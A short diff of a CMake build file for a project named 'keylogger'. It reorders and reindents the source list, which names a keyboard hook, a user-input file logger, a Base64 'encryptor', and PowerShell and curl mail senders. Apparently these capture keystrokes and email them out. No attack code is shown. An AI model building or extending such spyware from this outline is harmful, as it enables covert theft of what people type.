@@ -3,14 +3,15 @@ set(SOURCES
 		DefaultFileSystemAccess.cpp
 		KeyloggerDirectoryLocator.cpp
 		Base64Encryptor.cpp
-        TimestampFetcher.cpp
-        PowerShellSendMailScriptCreator.cpp
-        PowerShellMailSender.cpp
-        CurlMailSender.cpp
+		TimestampFetcher.cpp
+		PowerShellSendMailScriptCreator.cpp
+		PowerShellMailSender.cpp
+		CurlMailSender.cpp
 		UserInputFileLogger.cpp
-		Helper.cpp
-		KeyboardHook.h
+		KeyboardInput.cpp
+		KeyboardProcessor.cpp
 		Keylogger.cpp
+		KeyloggerFactory.cpp
 		)
 
 add_executable(keylogger ${SOURCES} "Main.cpp")
